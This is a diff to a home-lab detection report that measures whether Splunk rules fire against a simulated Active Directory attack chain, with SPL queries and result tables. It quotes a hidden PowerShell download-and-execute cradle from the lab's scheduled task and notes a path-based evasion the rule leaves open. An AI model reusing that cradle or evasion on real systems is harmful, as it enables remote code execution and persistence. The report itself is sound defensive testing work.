@@ -37,27 +37,37 @@ three pipeline-health searches are not detection cells and are not listed.
 | # | Rule | Phase | Before | Mark |
 | - | ---- | ----- | ------ | ---- |
 | 1 | LOLBin Execution (CIM tstats) | 3 | N/E | — |
-| 2 | C2 Beacon from User-Writable Path | 5b | *not yet measured* | |
+| 2 | C2 Beacon from User-Writable Path | 5b | **✓ fires on both hosts — and one allowlist gap** | M |
 | 3 | Kerberoasting RC4 Service Ticket | 4a | **✗ silent — by design, the roast was AES** | M |
 | 4 | Kerberoasting User-SPN (etype-agnostic) | 4a | **✓ fires** | M |
 | 5 | Password Spray (multi-user from one source) | 2 | **✗ silent — one account below threshold** | M |
 | 6 | Spray Success (4771 then 4768 same source) | 2 | **✓ fires — and one false positive** | M |
 | 7 | SAM Hive Dump via reg save | 9b | N/E | — |
 | 8 | DCSync from non-DC | 9c | N/E | — |
-| 9 | Scheduled Task Persistence | 10 | *not yet measured* | |
+| 9 | Scheduled Task Persistence | 10 | **✓ fires — 1 of 1, no false positives** | M |
 | 10 | LSASS Access (credential theft mask) | 8 | **✓ fires** | M |
 | 11 | Kerbrute User Enumeration (4768 error 0x6) | 1 | **✗ silent — structural** | M |
 | 12 | Verify Account Lockout (post FGPP) | 2 | **✓ fires, output unusable** | M |
 | 13 | RC4 Anomaly (post AES enforcement) | 4a | **✗ silent — nothing to anomaly on yet** | M |
 | 14 | Sliver C2 Beacon by JA4 Fingerprint | 5a | **✓ fires on one of two hosts** | M |
-| 15 | Large Outbound Transfer | 11, 12 | *not yet measured* | |
+| 15 | Large Outbound Transfer | 11, 12 | **✓ fires on both exfils — and one false positive** | M |
 
-Nine measured, three N/E, three outstanding. Of the nine, four fire and five are silent — but the
-split that matters is not fires-versus-silent. It is that **two of the four that fire are
-defective in ways a tick in this column would hide**: `#12` fires and cannot say which account
-was locked, and `#6` fires on the attack and also on benign clock skew. And of the five silent,
-three are silent for reasons that are correct or by design, one is silent by a single account,
-and none are silent because the rule is simply wrong.
+**The column is complete: twelve measured, three N/E.** Seven fire, five are silent.
+
+The split that matters is not fires-versus-silent. It is that **four of the seven that fire are
+defective in ways a tick in this column would hide**:
+
+| Rule | Fires on the attack, and also… |
+| ---- | ------------------------------ |
+| `#6` Spray Success | benign clock skew, ninety minutes before the chain |
+| `#12` Verify Account Lockout | cannot say which account was locked — both output columns empty |
+| `#2` C2 Beacon | `OneDrive\Update\OneDriveSetup.exe`, an allowlist gap |
+| `#15` Large Outbound | 12.5 MB of ordinary Microsoft HTTPS, on a placeholder threshold |
+
+Of the five silent, three are silent for reasons that are correct or by design (`#3`, `#11`,
+`#13`), one is silent by a single account (`#5`), and **none are silent because the rule is
+wrong.** That is the opposite of the v3 result, where rules failed by being wrong; here they
+fail by being imprecise, which is harder to see and is why every cell carries its query.
 
 Three cells are N/E by decision rather than by accident. A phase runs in the before-run only if
 a shipped rule measures it **and** the after-run will run it too; dropping a phase from one
@@ -68,6 +78,75 @@ repairing it mid-measurement would change the estate between columns.
 ---
 
 ## Cell detail
+
+### #2 — C2 Beacon from User-Writable Path, phase 5b: ✓ fires on both hosts
+
+This cell had three ways to come out empty and only one of them would have been about the rule,
+so the controls came first. The rule runs over the `Network_Traffic` CIM model rather than a raw
+sourcetype, and this lab has already shipped a rule that queried a model which never received the
+events it needed.
+
+**Control: the telemetry exists.**
+
+```
+index=main sourcetype=XmlWinEventLog EventCode=3 earliest=-1d latest=now
+| stats count values(DestinationIp) as dests by Image
+| sort -count
+```
+
+`C:\Temp\GlobalProtect_Update.exe` — 12 events, every one to `192.168.182.133`. Sysmon has it.
+
+**Control: the model holds the path in a form the rule's pattern matches.** The `app` values come
+back as `C:\Temp\GlobalProtect_Update.exe` — single backslashes, ordinary case — so `*\\Temp\\*`
+matches. No silent normalisation mismatch, which was the real risk.
+
+**The rule, verbatim** (including the `where NOT` OneDrive allowlist, which an earlier run of this
+measurement omitted — the first version returned every OneDrive row the shipped rule suppresses):
+
+```
+| tstats summariesonly=false allow_old_summaries=true count values(All_Traffic.dest_port) as dest_ports
+    from datamodel=Network_Traffic.All_Traffic
+    where (All_Traffic.app="*\\Temp\\*" OR All_Traffic.app="*\\AppData\\*" OR All_Traffic.app="*\\ProgramData\\*" OR All_Traffic.app="*\\Users\\Public\\*")
+    by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app _time span=1m
+| rename "All_Traffic.*" AS *
+| where NOT (like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe")
+      OR like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe")
+      OR like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\%\\OneDrive.Sync.Service.exe"))
+| stats count dc(_time) as beacons earliest(_time) as firstTime latest(_time) as lastTime by src dest dest_port app
+```
+
+| src | dest | port | app | beacons | window | verdict |
+| --- | ---- | ---- | --- | ------- | ------ | ------- |
+| SPIDERMAN | `-` | 443 | `C:\Temp\GlobalProtect_Update.exe` | 6 | 6 Nov 12:04–12:09 | **true positive** |
+| THEPUNISHER | `-` | 443 | `C:\Temp\GlobalProtect_Update.exe` | 1 | 6 Nov 16:48 | **true positive** |
+| THEPUNISHER | `-` | 443 | `OneDrive\Update\OneDriveSetup.exe` | 2 | 2 Nov | **false positive** |
+| THEPUNISHER | akamai | 80 | `OneDrive\Update\OneDriveSetup.exe` | 1 | 2 Nov | **false positive** |
+| SPIDERMAN | `-` | 8089 | `C:\Temp\nettest.exe` | 1 | 31 Oct | own test binary, outside the chain |
+
+**The strongest corroboration in this column.** SPIDERMAN's window here, 12:04 to 12:09, matches
+`#14`'s JA4 window of 12:04:15 to 12:09:15 to the minute — two independent telemetry paths,
+Sysmon `EventCode=3` through the CIM model and Zeek's TLS handshakes, agreeing on the same beacon.
+Six one-minute buckets against eleven handshakes is consistent: the handshakes cluster inside
+those minutes.
+
+**And the two C2 rules are complementary, which neither description says.** `#14` is silent on
+THEPUNISHER because one TLS handshake cannot clear `count > 5`. `#2` has THEPUNISHER, because it
+counts a process connecting from a user-writable path rather than a beacon interval. Together
+they cover both endpoints; **neither covers both alone.** The after-run should be read with that
+pairing in mind — a bundle that breaks one does not necessarily lose the host.
+
+**The allowlist gap is a real defect, not noise.** The three allowlist entries cover
+`OneDrive\OneDrive.exe`, `OneDrive\OneDriveStandaloneUpdater.exe` and
+`OneDrive\<version>\OneDrive.Sync.Service.exe`. They do not cover
+`OneDrive\Update\OneDriveSetup.exe`, which is a fourth OneDrive binary in a fourth directory
+shape, and it fires. The allowlist was measured against the benign window and this binary did not
+run in it — the same blindness that `#10` and `#15` both hit, for the third time in this column.
+
+**`dest` is empty on every beacon row.** The model returns `-` where the destination belongs,
+while Sysmon knows it is `192.168.182.133`. So the alert names the process, the port and the host
+it ran on, and not the thing it was talking to. That is the same defect class as `#12`'s empty
+columns: the rule fires, and what it hands the analyst is missing the field they will ask for
+first.
 
 ### #3 — Kerberoasting RC4 Service Ticket, phase 4a: ✗ silent, by design
 
@@ -191,6 +270,65 @@ one-line change to a rule in the middle of a before/after measurement, so it wai
 with the others. Recorded here so the after-run column is read knowing this rule has a benign
 firing mode that has nothing to do with hardening.
 
+### #9 — Scheduled Task Persistence, phase 10: ✓ fires, 1 of 1
+
+The rule verbatim returns one row:
+
+| `_time` | host | Account_Name | Task_Name | task_command | task_runas |
+| ------- | ---- | ------------ | --------- | ------------ | ---------- |
+| 6 Nov 17:19:10 | THEPUNISHER | `frankcastle` | `\Updater` | `powershell.exe` | `S-1-5-18` |
+
+with `task_args` carrying the cradle in full:
+`-WindowStyle Hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.182.133/update.ps1'))"`.
+
+**Control: what the rule chose not to return.** Three `4698` events exist in the window.
+
+```
+index=main source="WinEventLog:Security" EventCode=4698 earliest=-1d latest=now
+| rex "<Command>(?<task_command>[^<]+)</Command>"
+| rex "<UserId>(?<task_runas>[^<]+)</UserId>"
+| table _time host Account_Name Task_Name task_command task_runas
+```
+
+| host | Account_Name | Task_Name | task_command | task_runas | excluded by |
+| ---- | ------------ | --------- | ------------ | ---------- | ----------- |
+| THEPUNISHER | `frankcastle` | `\Updater` | `powershell.exe` | `S-1-5-18` | — (fires) |
+| HYDRA-DC | `HYDRA-DC$` | Windows Defender Scheduled Scan | `MpCmdRun.exe` | `S-1-5-18` | `Account_Name!="*$"` |
+| HYDRA-DC | `Administrator` | `\CreateExplorerShellUnelevatedTask` | `C:\Windows\Explorer.EXE` | `MARVEL\Administrator` | the `where` clause |
+
+One true positive, two benign, both correctly rejected, and **by different mechanisms** — which is
+what makes this a real negative test rather than an absence of noise. The Defender task runs as
+`S-1-5-18` and would have satisfied `runas_system=1`; the only thing that stops it is
+`Account_Name!="*$"`. The rule's own description calls that filter load-bearing rather than
+hygiene, and this is it being load-bearing. The Explorer task passed the machine-account filter
+and was rejected on the merits: not SYSTEM, no user-writable command path, no cradle.
+
+**The v3 gap is closed, and measurably.** In v3 this task was caught only by the SYSTEM-runas
+branch, because `<Command>` is `powershell.exe` and the whole cradle sits in `<Arguments>`, so
+both path tests miss. The Arguments branch added afterwards now catches it too. Two independent
+branches fire on the same row, which means the same task created in a user context — the case v3
+noted would have walked through — is now covered. That was the point of the fix and this is the
+first run where both branches had the chance to prove it.
+
+The known evasion the rule leaves open on purpose is untouched by this cell: a command path
+written as `%APPDATA%\evil.exe` still matches neither path branch, and the decision not to add an
+environment-variable branch was measured and recorded rather than assumed.
+
+### #10 — LSASS Access, phase 8: ✓ fires
+
+Measured on 6 November and written up in full, including a false-positive source the benign
+window could not contain, in
+[the v4 README's before-run section](README.md#before-run-detection-measurement-6-nov-2026--two-cells-closed-and-a-false-positive-source-the-benign-window-could-not-see).
+The attack row:
+
+| Time | Host | SourceImage | GrantedAccess |
+| ---- | ---- | ----------- | ------------- |
+| 6 Nov 17:06:07 | THEPUNISHER | `notepad.exe` | `0x1f3fff` |
+
+`SharpKatz` ran through Sliver's `execute-assembly`, which executes in a sacrificial process, so
+the beacon path never appears as `SourceImage`. A cell written from a search for the beacon path
+would have read as a miss while the rule had in fact fired.
+
 ### #11 — Kerbrute User Enumeration, phase 1: ✗ silent, structural
 
 The rule, verbatim, over a window containing the enum:
@@ -257,21 +395,6 @@ and they are accounts the spray touched that produce no `4771` at all. The `#5` 
 distinct accounts from `4771`, so its account count understates what the spray actually tried —
 by exactly two here. That caveat was already written into the rule's description from the v3 case
 file; this is the first time there is a number on it.
-
-### #10 — LSASS Access, phase 8: ✓ fires
-
-Measured on 6 November and written up in full, including a false-positive source the benign
-window could not contain, in
-[the v4 README's before-run section](README.md#before-run-detection-measurement-6-nov-2026--two-cells-closed-and-a-false-positive-source-the-benign-window-could-not-see).
-The attack row:
-
-| Time | Host | SourceImage | GrantedAccess |
-| ---- | ---- | ----------- | ------------- |
-| 6 Nov 17:06:07 | THEPUNISHER | `notepad.exe` | `0x1f3fff` |
-
-`SharpKatz` ran through Sliver's `execute-assembly`, which executes in a sacrificial process, so
-the beacon path never appears as `SourceImage`. A cell written from a search for the beacon path
-would have read as a miss while the rule had in fact fired.
 
 ### #12 — Verify Account Lockout, phase 2: ✓ fires, and the output is unusable
 
@@ -366,26 +489,56 @@ with that asymmetry named, since reading the alert alone loses half the evidence
 
 ---
 
-## Not yet measured
+### #15 — Large Outbound Transfer, phases 11 and 12: ✓ fires on both exfils, plus one false positive
 
-Three cells: `#2 C2 Beacon from User-Writable Path`, `#9 Scheduled Task Persistence`, and
-`#15 Large Outbound Transfer`.
+`enableSched = 0`, so measured by running the search. Three rows:
 
-The chain that produces them ran on 6 November and the evidence is still in the index, so these
-are re-runnable now and will not be re-runnable indefinitely — Splunk's `main` index has already
-rolled older buckets off once in this lab's history, which is how the 20 October raw data was
-lost.
+| `_time` | orig_h | MB out | ports | verdict |
+| ------- | ------ | ------ | ----- | ------- |
+| 6 Nov 17:20 | `192.168.182.137` | 14.3 | 80, 138, 443, **8080** | IPv4 exfil |
+| 6 Nov 17:30 | `fd15:…:336d:c973` | 66.8 | 136, 443, **8080**, 8081 | IPv6 exfil |
+| 6 Nov 16:40 | `192.168.182.137` | 12.5 | 80, 137, 138, 443 | **false positive** |
 
-Two notes on method, so these three are filled the same way the nine were:
+Both exfiltration phases fire, including the IPv6 one — the rule's IPv6 branch works against a
+real transfer, which is the first time it has been exercised.
 
-- `#15` ships with `enableSched = 0`, like `#12`. It must be measured by re-running its search.
-  An absent alert says nothing about it.
-- `#2` runs over the `Network_Traffic` CIM data model rather than a raw sourcetype, so a silent
-  result has one more possible cause than usual: the rule can be right, the attack can have
-  happened, and the model can still be missing the event. The cell is not complete without
-  checking whether Sysmon `EventCode=3` exists for the beaconing process **and** whether
-  `All_Traffic.app` holds the path in the form the rule's `*\\Temp\\*` pattern matches. This lab
-  has already shipped one rule that queried a model which never received the events it needed.
+**The third row, attributed.** The `values(resp_p)` list in the rule's output names which ports
+appeared and says nothing about how the bytes divide, so the row had to be broken down before it
+could be called anything:
+
+```
+… | where orig_h="192.168.182.137" AND _time>=…16:40 AND _time<…16:50
+| stats sum(orig_bytes) as bytes by resp_h resp_p service | sort -bytes
+```
+
+| resp_h | port | service | bytes |
+| ------ | ---- | ------- | ----- |
+| `20.209.97.107` | 443 | ssl | **13,091,342** |
+| `192.168.182.131` | 9997 | — | 2,573,830 |
+| `4.208.165.242` | 443 | ssl | 24,278 |
+| `192.168.182.255` | 137 | dns | 150 |
+
+One destination accounts for all of it: 12.5 MB of ordinary Microsoft HTTPS. A hypothesis that
+NetBIOS broadcast was inflating the total was wrong by four orders of magnitude — port 137
+contributed 150 bytes. And the forwarder exclusion works: 2.57 MB to `.131:9997` is in the raw
+data and absent from the rule's 12.48 MB sum.
+
+So this is the placeholder threshold doing exactly what its own description predicts: 10 MB per
+10 minutes was never calibrated and a single Windows service download clears it.
+
+**Which makes it the third instance of one pattern, and that pattern is the finding.** This false
+positive could not have appeared in the benign baseline, because the guests had no working egress
+during that window (the dated 6 November note in [the v4 README](README.md) has the measurements)
+— so the baseline measured `Large Outbound` against telemetry traffic only and found four rows,
+all of them monitoring. Alongside `#10` (a benign LSASS reader that needs a Sysmon restart the
+window contained none of) and `#2` (a fourth OneDrive binary that did not run in the window), that
+is three rules whose false-positive profile the benign window was structurally unable to measure.
+Three independent cases, one cause: **a false positive the baseline cannot see is a false positive
+whose trigger the baseline's conditions excluded.** For `#15` the excluded condition is the thing
+step 8 exists to fix, which means its threshold cannot be calibrated until that is done — the
+rule and the fix are waiting on the same event.
+
+---
 
 ## Still owed to this matrix
 
@@ -397,7 +550,7 @@ already depend on Zeek to mean anything (`#11`, where Zeek holds the only record
 `#5`, where it supplies the undercount). Wazuh and Suricata are unexamined for this run. An empty
 Wazuh column is a finding; an unmentioned one is an error.
 
-**The fixes this column has earned, all held until step 8.** Four rules want changes that are
+**The fixes this column has earned, all held until step 8.** Five rules want changes that are
 deliberately not being made, because changing a rule between the before and after columns
 destroys the comparison those columns exist to make:
 
@@ -406,7 +559,13 @@ destroys the comparison those columns exist to make:
 | `#10` LSASS Access | exclude `C:\Windows\Sysmon64.exe` | fires benignly after a DC Sysmon restart, which the bundles will cause |
 | `#12` Verify Account Lockout | `Account_Locked_Out_Name`; drop `Caller_Computer_Name` | fires correctly, reports nothing usable |
 | `#6` Spray Success | exclude `0x25` from the failure side | benign clock skew satisfies the rule's shape |
-| `#15` Large Outbound Transfer | calibrate the placeholder threshold | needs the second benign window's real egress |
+| `#2` C2 Beacon | extend the OneDrive allowlist to `OneDrive\Update\OneDriveSetup.exe` | a fourth OneDrive binary in a fourth directory shape |
+| `#15` Large Outbound Transfer | calibrate the placeholder threshold | needs the second benign window's real egress, which does not exist yet |
 
 `#13` is owed a positive test rather than a fix: after AES enforcement, a deliberate RC4 request
 should produce a row, and without that test its two silences prove nothing.
+
+`#2` and `#15` are owed something beyond their own fix, and it is the same thing. Both have a
+`dest`-shaped hole — `#2` because the CIM model returns `-` where the destination belongs, `#15`
+because its output names ports and not the bytes behind them. In both cases the rule fires and
+the analyst's first question is the one the output cannot answer. Neither is a tuning problem.
